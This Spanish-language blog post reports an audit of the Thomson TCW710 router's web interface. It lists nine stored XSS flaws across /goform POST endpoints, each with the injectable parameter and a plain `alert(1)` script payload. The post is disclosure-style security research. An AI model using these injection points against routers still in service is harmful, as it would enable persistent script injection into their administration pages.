=== Content from alquimistadesistemas.com_62d1130f_20250125_162457.html ===

[![Alquimista de sistemas](https://alquimistadesistemas.com/images/logo.png)](https://alquimistadesistemas.com/)

de sistemas

* [ofensiva](/category/ofensiva)
* [defensiva](/category/defensiva)
* [linux](/category/linux)
* [windows](/category/windows)
* [bash](/category/bash)
* [web](/category/web)
* [vbs](/category/vbs)
* [mysql](/category/mysql)
* [red](/category/red)

# Auditando router thomson tcw710

---

* lun 19 febrero 2018
* [ofensiva](https://alquimistadesistemas.com/category/ofensiva)
* [#auditar router xss](https://alquimistadesistemas.com/tag/auditar-router-xss.html)

![Router thomson](/images/thomson-front.jpg "Router thomson")

Este route SOHO era el que te instalaban cuando estaba ONO allÃ  por el 2007. Es un router ya antiguo, sin un uso a nivel de empresas, pero sigue vendiendose en webs de segundamano, no sÃ© si como objeto ya de colecciÃ³n antiguo.
Como uno de tantos apartaos que tengo por casa a este se me ocurrio realizarlee una pequeÃ±a auditoria a su interfa web.

### Info del dispositivo

* Marca: Thomson
* Modelo: TCW710
* Hardware version: 5.0
* Software version: ST5D.10.05

### Resumen

Al ser un modelo antiguo encontrÃ© que todos los campos donde se podia introducir texto se podÃ­a realizar un xss injection que en este caso son persistentes.

## Artefactos encontrados

![Router thomson](/images/thomson-back.jpg "Router thomson trasero")

### XSS Persistente 1

El primer XSS persistente lo encontramos en la siguiente peticiÃ³n:

* URL: /goform/wlanPrimaryNetwork
* Tipo: POST

| Parametro | Tipo | Valor | Inyectable | Payload |
| --- | --- | --- | --- | --- |
| ServiceSetIdentifier | String |  | SÃ­ | `><script>alert(1)</script>` |
| ClosedNetwork | bool | 0 | No |  |
| WpaPskAuth | bool | 1 | No |  |
| Wpa2PskAuth | bool | 1 | No |  |
| WpaEncryption | integer | 3 | No |  |
| WpaPreSharedKey | String | 123456789qwerty | ? |  |
| WpaReKeyInterval | integer | 0 | No |  |
| GenerateWepKey | bool | 0 | No |  |
| WepKeysGenerated | bool | 0 | No |  |
| commitwlanPrimaryNetwork | bool | 1 | No |  |

### XSS Persistente 2 y 3

El segundo y tercero XSS persistente lo encontramos en la siguiente peticiÃ³n:

* URL: /goform/RGFirewallEL
* Tipo: POST

| Parametro | Tipo | Valor | Inyectable | Payload |
| --- | --- | --- | --- | --- |
| EmailAddress | String | aaaa | Yes | `><script>alert(1)</script>` |
| SmtpServerName | String | aaaa | Yes | `><script>alert(1)</script>` |
| LogAction | bool | 0 | No |  |

### XSS Persistente 4, 5 y 6

El cuarto, quito y sexto XSS persistente lo encontramos en la siguiente peticiÃ³n:

* URL: /goform/RgTime
* Tipo: POST

| Parametro | Tipo | Valor | Inyectable | Payload |
| --- | --- | --- | --- | --- |
| TimeSntpDisable | Integer | 2 | No |  |
| TimeServer1 | String | aaaa | Yes | `><script>alert(1)</script>` |
| TimeServer2 | String | aaaa | Yes | `><script>alert(1)</script>` |
| TimeServer3 | String | aaaa | Yes | `><script>alert(1)</script>` |
| TimeZoneOfsetHrs | Integer | 0 | No |  |
| TimeZoneOfsetMins | Integer | 0 | No |  |
| ResetSntpDefaults | bool | 0 | No |  |

### XSS Persistente 7

El septimo XSS persistente lo encontramos en la siguiente peticiÃ³n:

* URL: /goform/RgDdns
* Tipo: POST

| Parametro | Tipo | Valor | Inyectable | Payload |
| --- | --- | --- | --- | --- |
| DdnsService | bool | 0 | No |  |
| DdnsUserName | String | aaaa | No |  |
| DdnsPassword | String | aaaa | No |  |
| DdnsHostName | String | aaaa | Yes | `><script>alert(1)</script>` |

### XSS Persistente 8

El octavo XSS persistente lo encontramos en la siguiente peticiÃ³n:

* URL: /goform/RgDhcp
* Tipo: POST

| Parametro | Tipo | Valor | Inyectable | Payload |
| --- | --- | --- | --- | --- |
| WanConnectionType | Integer | 2 | No |  |
| PppUserName | String | aaaa | Yes | `><script>alert(1)</script>` |
| PppPassword | String | aaaa | No |  |
| Mtu | Integer | 0 | No |  |
| PptpL2tpServer | String | aaaa | No |  |
| SpoofedMacAddressMA0 | String | 00 | No |  |
| SpoofedMacAddressMA1 | String | 00 | No |  |
| SpoofedMacAddressMA2 | String | 00 | No |  |
| SpoofedMacAddressMA3 | String | 00 | No |  |
| SpoofedMacAddressMA4 | String | 00 | No |  |
| SpoofedMacAddressMA5 | String | 00 | No |  |

### XSS Persistente 9

El noveno XSS persistente lo encontramos en la siguiente peticiÃ³n:

* URL: /goform/RgUrlBlock.asp
* Tipo: POST

| Parametro | Tipo | Valor | Inyectable | Payload |
| --- | --- | --- | --- | --- |
| BasicParentalNewKeyword | String | aaaa | Yes | `><script>alert(1)</script>` |
| BasicPaentalKeywordAction | Integer | 1 | No |  |
| BasicParentalNewdomain | String | aaaa | No |  |
| BasicParetalDomainAction | Integer | 0 | No |  |

* [Archivos](https://alquimistadesistemas.com/archives.html)
* [Categorias](https://alquimistadesistemas.com/categories.html)
* [Tags](https://alquimistadesistemas.com/tags.html)

* [![GitHub](/images/github.png)](https://github.com/jbenages)
* [![Linkedin](/images/linkedin.png)](https://www.linkedin.com/in/jbenages/)
* [![RSS](/images/rss.png)](/feeds/all.atom.xml)

* ![Logo de bitcoin](/images/btc.png)1GS6WfypypK8rDhwAuqnHcM4dLrr6uDybk


